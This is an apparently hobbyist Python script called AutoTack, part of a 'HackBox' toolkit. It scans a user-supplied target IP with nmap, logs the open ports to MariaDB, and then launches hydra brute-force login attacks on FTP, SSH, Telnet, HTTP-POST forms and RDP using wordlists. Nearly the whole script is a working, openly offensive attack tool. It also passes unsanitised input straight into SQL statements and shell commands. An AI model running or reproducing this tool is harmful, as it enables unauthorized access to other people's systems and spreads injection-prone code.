#！/usr/bin/env python

## AutoTack - Auto scan and attack Module
## will eventually be integrated with a database (mariadb?) for storing scanned IP addresses 


## this script must be run as root!!
## notes: db change: hackbox_db > 127.0.0.1 (or other IP) etc > each ip has a list of ports

## Dependencies: Nmap

import os
import mysql.connector
import subprocess as sp

## -- global vars -- ##


## -- SQL connection -- ##
mydb = mysql.connector.connect(
  host="localhost",
  user="root",
  password="PASSWORD"
  )
mycursor = mydb.cursor()
## -- -- ##
os.system('systemctl start mariadb')
os.system('clear')

print(r"""
  ___  _   _ _____ _____      _____ ___  _____  _   __
 / _ \| | | |_   _|  _  |    |_   _/ _ \/  __ \| | / /
/ /_\ \ | | | | | | | | |______| |/ /_\ \ /  \/| |/ / 
|  _  | | | | | | | | | |______| ||  _  | |    |    \ 
| | | | |_| | | | \ \_/ /      | || | | | \__/\| |\  \
\_| |_/\___/  \_/  \___/       \_/\_| |_/\____/\_| \_/
        """)



## --- Menu --- ###
print("""
OPTIONS 
a) Scan and Can (Nmap + Common Password Bruteforce)
b) ???



i) Install: Run First time only! This creates the database
    Note: type 'delete db' to drop the DB


---
h)Help
q)Exit/Quit
---
Type in IP address to view info:              """)


statement = input("").lower()

## --- Main Body Loop --- ##



while True:
    ## reload statement/variable, needs to be at top so accessible to all further down
    if statement == 'reload':
        os.system('python3 Modules/attack/autotack/autotack.py')
        #reload = os.system('python3 Modules/attack/autotack/autotack.py')
## --- interface --- ###

    ## --- entering into database + scan --- ##

    elif statement =='a':
        targetIP = input('Enter target IP address:')
        #print(targetIP)
        nmapFLAGS = input('Enter additional NMAP flags - default are -sS and -Pn; syntax: "-a -T 4"')
        print("This may take a minute...")
        print("-----Open Ports-----")

        ## This code is running nmap scan, and saving it as the variable scanresult (need to import subprecess)
        ## note: stdout is piped through grep to filter by only numbers, then get rid of the "starting Nmap" message becuase it takes up alot of space

        scanresult = sp.getoutput('nmap ' + targetIP +' ' + nmapFLAGS + ' -Pn | grep -e "[0-9]*/" | grep -v "Starting"')
        ## for exluding everyhting but port numbers: |grep -o "[0-9]*"

    ## -- conversion from . to _ -- ##

        print(scanresult)
        ## convert '.' to '_' due to sql not accepting '.'
        convert = targetIP
        convert = convert.replace('.','_')
        targetIPinput = convert
        #targetipconvert = print(int(convert))



    ## --- Sql Interaction --- ##

        mycursor.execute("USE hackbox_ip_db")
        #mycursor.execute("INSERT INTO ip_addresses (ipaddress, port) VALUES (" + targetIP + "," + scanresult + ");")

        mycursor.execute("CREATE TABLE " + targetIPinput + " (OpenPorts text)")
        mycursor.execute("INSERT INTO " + targetIPinput + "(OpenPorts) VALUES ('" + scanresult+ "')")
        mydb.commit()
        print("----------")

    ## -- Pulling from DB and scanning -- ##
        #removing tmp below incase it already exists. cant overwrite, its a limitation of sql
        os.system(" rm -rf /var/lib/mysql/hackbox_ip_db/tmp")
        mycursor.execute("SELECT * FROM " + targetIPinput + " INTO OUTFILE 'tmp'") ## writes to /var/lib/mysql/hackbox_ip_db/tmp

        #print('--')


        ## This pulls the port number from the db - in future will add service puller too (ex ssh)
        attackList = sp.getoutput('cat /var/lib/mysql/hackbox_ip_db/tmp | grep -o "[0-9]"*')

        #print('Open Ports are:')
        #print(attackList)
        ## this will output the ports stored. Now need to write AI/if commands for detecting ports
        ## ex: if 22 in tmp:
        ## then protocolcrack ssh or soemthing

        ##Final Confirmation
        print("Begin Attack? (y/N)")
        beginattack = input().lower()
        if 'y' in beginattack:

        ## -- Module Integration -- ## -- maybe have attack results saved somewhere, maybe in db???
            print('Enter Wordlist locations, or hit enter/leave blank for default')
            print('For reference, Your current Directory:')
            os.system('pwd')

            print('\nUsername List:\n')
            userlist = input().lower()
            print('\nPassword List:\n')
            passlist = input().lower()

            if userlist == "":
                userlist = 'Modules/attack/systemaccess/protocolcracker/simpleuser.txt'
            if passlist == "":
                passlist = 'Modules/attack/systemaccess/protocolcracker/simplepass.txt'


            if '21' in attackList:
                print('----------')
                print('\nStarting FTP bruteforce\n')
                os.system('hydra -I -L ' + userlist + ' -P ' + passlist + ' ftp://' + targetIP  )

            if '22' in attackList:
                print('----------')
                print('\nStarting SSH bruteforce\n')
                os.system('hydra -I -L ' + userlist + ' -P ' + passlist + ' ssh://' + targetIP  )

                #os.system('hydra -I -L Modules/attack/systemaccess/protocolcracker/simpleuser.txt -P Modules/attack/systemaccess/protocolcracker/simplepass.txt ssh://' + targetIP  )

            if '23' in attackList:
                print('----------')
                print('\nStarting TELNET bruteforce\n')
                os.system('hydra -I -L ' + userlist + ' -P ' + passlist + ' telnet://' + targetIP  )
                ## later on add more options, like level of depth of scan, for now this will use basic login creds
                print('--')


            if '80' in attackList:
                print('There are many possible attacks for webservers; please make a selection for which attack below')
                http_attack_type = input().lower()

                print ('''
                    a) HTTP-POST - Webapp login forms
                            ''')
            ## -- HTTP POST -- ##
                if http_attack_type == 'a':
                    print('----------')
                    print('For a succesful HTTP-POST attack, hydra must know the location of the login form, please enter the URL of the form below')
                    loginform = input().lower()

                    print('\nStarting HTTP-POST bruteforce\n')
                    os.system('hydra -I -L ' + userlist + ' -P ' + passlist + ' http-post://'  + targetIP + '/' + loginform )
                    print('--')

            if '3389' in attackList:
                print('--')
                print('Starting RDP bruteforce')
                print('\n')
                os.system('hydra -I -L ' + userlist + ' -P ' + passlist + ' rdp://' + targetIP  )
                ## later on add more options, like level of depth of scan, for now this will use basic login creds
                print('----------')


                ## Final stuff
            print('----------')
            print('\nAttack completed, scroll through stdout to see if successful! Text should be green!\n')
            print('\nType reload to head back to the main menu\n')
        ## -- logging -- ##
            #logfile = open("logs/autotack.log", "a")
            #logfile.write(log)
            #logfile.close
        elif 'n' in beginattack:
            reload
        else:
            reload

        ## cleaning up ##
        #removing tmp cause I dont know how to overwrite the file with mariadb yet :(
        os.system(" rm -rf /var/lib/mysql/hackbox_ip_db/tmp")

    elif '.' in statement:
        ipsummon = statement
        #ipsummon = '1'
        #print(scanresult)
        ## convert '.' to '_' due to sql not accepting '.'
        convertback = ipsummon
        convertback = convertback.replace('.','_')
        ipsummoninput = convertback
        #print(ipsummoninput)

        os.system('rm -rf /var/lib/mysql/hackbox_ip_db/ipcall_tmp')
        mycursor.execute("USE hackbox_ip_db")
        mycursor.execute("SELECT * FROM " + ipsummoninput + " INTO OUTFILE 'ipcall_tmp'")
        ipcall = sp.getoutput('cat /var/lib/mysql/hackbox_ip_db/ipcall_tmp | grep -e "[0-9]"*/*')
        print('\n')
        print(ipsummon + "'s open ports and services:")
        print('----------')
        print(ipcall)
        print('----------')





        ## need to beable to put this ^^ in variable and then grep the output for only the numbers ports and type (tcp/udp) so that can be sent to a attack program
        #print(dbpull)
        # This code below allows all data to be viewed in the db
        for x in mycursor:
            print (x)


    elif statement =='delete db':
        print("Are you sure you want to delete the DB? (y/N)")
        deletedb = input().lower()
        if 'y' in deletedb:
            mycursor.execute("DROP DATABASE hackbox_ip_db")
        elif 'n' in deletedb:
            reload
        else:
            reload
        #mycursor.execute("SHOW DATABASES")
        ## add a confirmation prompt here

        print('database hackbox_ip_db has been dropped')
        for x in mycursor:
            print (x)



    elif statement =='i':

        #Creating Database
        mycursor.execute("CREATE DATABASE hackbox_ip_db")
        mycursor.execute("USE hackbox_ip_db")
        # TEST TABLE #mycursor.execute("CREATE TABLE 127_0_0_1")#(ipaddress text, port text, time text )")
        #mycursor.execute("INSERT INTO ip_addresses (ipaddress, port) VALUES ('123.456.789.0', '69');")


        ## cleanup
        mydb.commit()
        ## these 2 are commented out becuase it closes cursor, which causes the need for a program restart. work on solution/notice later.
        #mydb.close()
        #mycursor.close()
        for x in mycursor:
            print (x)
        print('Database Created!')
    elif statement == 'q':
        os.system('python3 HackBox.py')

    else:
        print('ya broke it doofus')
    statement = input("").lower()
